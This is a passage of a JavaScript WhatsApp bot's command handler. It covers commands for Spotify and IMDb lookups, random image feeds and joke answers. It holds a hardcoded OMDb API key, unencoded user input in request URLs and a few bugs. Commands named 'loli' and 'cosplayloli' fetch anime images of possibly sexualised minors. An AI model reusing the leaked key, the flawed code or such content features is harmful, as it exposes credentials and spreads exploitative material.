Id : ${q.split("|")[0]}
ID Zone: ${q.split("|")[1]}`)
}
break
case 'spotify':{
	if (!text) return reply(`*Please enter a song name*`)
    try {
        const apiUrl = `https://www.guruapi.tech/api/spotifyinfo?text=${encodeURIComponent(text)}`
        const response = await fetch(apiUrl);
        if (!response.ok) {
            console.log('Error searching for song:', response.statusText)
            return reply('Error searching for song')
        }
        const data = await response.json()
        const coverimage = data.spty.results.thumbnail
        const name = data.spty.results.title
        const slink = data.spty.results.url
        const dlapi = `https://www.guruapi.tech/api/spotifydl?text=${encodeURIComponent(text)}`
        const audioResponse = await fetch(dlapi)
        if (!audioResponse.ok) {
            console.log('Error fetching audio:', audioResponse.statusText)
            return reply('Error fetching audio')
        }
        const audioBuffer = await audioResponse.buffer()
        const tempDir = os.tmpdir()
        const audioFilePath = path.join(tempDir, 'audio.mp3')
        try {
            await fs.promises.writeFile(audioFilePath, audioBuffer)
        } catch (writeError) {
            console.error('Error writing audio file:', writeError)
            return reply( 'Error writing audio file')
        }
        let doc = {
            audio: {
              url: audioFilePath
            },
            mimetype: 'audio/mpeg',
            ptt: true,
            waveform:  [100, 0, 100, 0, 100, 0, 100],
            fileName: "dgxeon",
            contextInfo: {
              mentionedJid: [m.sender],
              externalAdReply: {
                title: `PLAYING TO ${name}`,
                body: botname,
                thumbnailUrl: coverimage,
                sourceUrl: websitex,
                mediaType: 1,
                renderLargerThumbnail: true
              }
            }
        }        
        await EliteProEmpire.sendMessage(m.chat, doc, { quoted: m })
    } catch (error) {
        console.error('Error fetching Spotify data:', error)
        return reply('*Error*')
    }
    }
    break
case 'imdb':
if (!text) return reply(`_Name a Series or movie`)
await XeonStickWait()
            let fids = await axios.get(`http://www.omdbapi.com/?apikey=742b2d09&t=${text}&plot=full`)
            let imdbt = ""
            console.log(fids.data)
            imdbt += "⚍⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚍\n" + " ``` IMDB SEARCH```\n" + "⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎⚎\n"
            imdbt += "🎬Title      : " + fids.data.Title + "\n"
            imdbt += "📅Year       : " + fids.data.Year + "\n"
            imdbt += "⭐Rated      : " + fids.data.Rated + "\n"
            imdbt += "📆Released   : " + fids.data.Released + "\n"
            imdbt += "⏳Runtime    : " + fids.data.Runtime + "\n"
            imdbt += "🌀Genre      : " + fids.data.Genre + "\n"
            imdbt += "👨🏻‍💻Director   : " + fids.data.Director + "\n"
            imdbt += "✍Writer     : " + fids.data.Writer + "\n"
            imdbt += "👨Actors     : " + fids.data.Actors + "\n"
            imdbt += "📃Plot       : " + fids.data.Plot + "\n"
            imdbt += "🌐Language   : " + fids.data.Language + "\n"
            imdbt += "🌍Country    : " + fids.data.Country + "\n"
            imdbt += "🎖️Awards     : " + fids.data.Awards + "\n"
            imdbt += "📦BoxOffice  : " + fids.data.BoxOffice + "\n"
            imdbt += "🏙️Production : " + fids.data.Production + "\n"
            imdbt += "🌟imdbRating : " + fids.data.imdbRating + "\n"
            imdbt += "✅imdbVotes  : " + fids.data.imdbVotes + ""
           EliteProEmpire.sendMessage(m.chat, {
                image: {
                    url: fids.data.Poster,
                },
                caption: imdbt,
            }, {
                quoted: m,
            })
            break
            case 'ebinary': {
if (!q) return reply(`Send/reply text with captions ${prefix + command}`)
let { eBinary } = require('./lib/binary.js')
let eb = await eBinary(`${q}`)
reply(eb)
}
break
case 'dbinary': {
if (!q) return reply(`Send/reply text with captions ${prefix + command}`)
let { dBinary } = require('./lib/binary.js')
let db = await dBinary(`${q}`)
reply(db)
}
break
case 'happymod':{
if (!q) return reply(`Example ${prefix+command} Sufway surfer mod`)
await XeonStickWait()
let kat = await scp2.happymod(q)
reply(util.format(kat))
}
break
case 'gdrive': {
		if (!args[0]) return reply(`Enter the Google Drive link`)
	await XeonStickWait()
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	EliteProEmpire.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break
case 'pinterest': {
if (!text) return reply(`Enter Query`)
let { pinterest } = require('./lib/scraper.js')
anutrest = await pinterest(text)
result = anutrest[Math.floor(Math.random() * anutrest.length)]
EliteProEmpire.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted: m })
}
break
case 'ringtone': {
		if (!text) return reply(`Example : ${prefix + command} black rover`)
        let ringtone = require('./lib/scraper.js')
		let anutone2 = await ringtone(text)
		let result = anutone2[Math.floor(Math.random() * anutone2.length)]
		EliteProEmpire.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
	    }
	    break
case 'tiktokgirl':
await XeonStickWait()
var asupan = JSON.parse(fs.readFileSync('./src/media/tiktokvids/tiktokgirl.json'))
var hasil = pickRandom(asupan)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokghea':
await XeonStickWait()
var gheayubi = JSON.parse(fs.readFileSync('./src/media/tiktokvids/gheayubi.json'))
var hasil = pickRandom(gheayubi)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokbocil':
await XeonStickWait()
var bocil = JSON.parse(fs.readFileSync('./src/media/tiktokvids/bocil.json'))
var hasil = pickRandom(bocil)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknukhty':
await XeonStickWait()
var ukhty = JSON.parse(fs.readFileSync('./src/media/tiktokvids/ukhty.json'))
var hasil = pickRandom(ukhty)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoksantuy':
await XeonStickWait()
var santuy = JSON.parse(fs.readFileSync('./src/media/tiktokvids/santuy.json'))
var hasil = pickRandom(santuy)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokkayes':
await XeonStickWait()
var kayes = JSON.parse(fs.readFileSync('./src/media/tiktokvids/kayes.json'))
var hasil = pickRandom(kayes)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktokpanrika':
await XeonStickWait()
var rikagusriani = JSON.parse(fs.readFileSync('./src/media/tiktokvids/panrika.json'))
var hasil = pickRandom(rikagusriani)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'tiktoknotnot':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'couplepp': case 'ppcouple': {
let anu = require('./src/media/randompics/ppcouple.json')
let random = anu[Math.floor(Math.random() * anu.length)]
EliteProEmpire.sendMessage(from, { image: { url: random.male }, caption: `Couple pp for male` }, { quoted: m })
EliteProEmpire.sendMessage(from, { image: { url: random.female }, caption: `Couple pp for female` }, { quoted: m })
}
break
case 'profilepic':  case 'profilepicture':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
await XeonStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
EliteProEmpire.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
            case 'remini': {
			if (!quoted) return reply(`Where is the picture?`)
			if (!/image/.test(mime)) return reply(`Send/Reply Photos With Captions ${prefix + command}`)
			await XeonStickWait()
			const { remini } = require('./lib/remini.js')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			EliteProEmpire.sendMessage(m.chat, { image: proses, caption: mess.success}, { quoted: m})
			}
			break
			case 'define': 
if (!q) return reply(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return reply(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   EliteProEmpire.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return reply(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await reply(jawab)
            }
            break
            case 'is': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await reply(jawab)
            }
            break
            case 'when': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await reply(jawab)
            }
            break
case 'what': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await reply(jawab)
            }
            break
case 'where': {
if (!text) return reply(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await reply(jawab)
            }
            break
case 'how': {
            	if (!text) return reply(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await reply(jawab)
            }
            break
case 'rate': {
            	if (!text) return reply(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await reply(jawab)
            }
            break
            case 'runtime': 
            case  'uptime': {
            await EliteProEmpire.sendMessage(m.chat, { react: { text: "⚙️",key: m.key,}})
            	let lowq = `*Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                reply(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const xeonkak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
EliteProEmpire.sendMessage(m.chat, { text: xeonkak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) return reply("This command is for group use only.")
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
EliteProEmpire.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./EliteProMedia/theme/elitepro.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return reply("This command is for group use only.")
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
EliteProEmpire.sendMessage(m.chat,
{ text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
Cieeee, What's Going On❤️💖👀`,
contextInfo:{
mentionedJid:[orang, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./EliteProMedia/theme/elitepro.jpg`),
"sourceUrl": `${wagc}`}}},
{ quoted: m})        
            }
            break
                        case 'coffee': case 'kopi': {
                EliteProEmpire.sendMessage(m.chat, {caption: mess.success, image: { url: 'https://coffee.alexflipnote.dev/random' }}, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) return reply('Enter Query Title')
                await XeonStickWait()
		let { wallpaper } = require('./lib/scraper.js')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                EliteProEmpire.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) return reply('Enter Query Title')
                await XeonStickWait()
		let { wikimedia } = require('./lib/scraper.js')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                EliteProEmpire.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`, image: { url: result.image }} , { quoted: m })
            }
            break
            case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      EliteProEmpire.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      EliteProEmpire.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      EliteProEmpire.sendMessage(m.chat, {image:  imageBuffer, caption: `Random ${command} for you!✨`}, {quoted: m})    
            }
            case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await XeonStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/Cyrilix-XMD/CYRILIX-STORE/main/img-x/hestia.json')
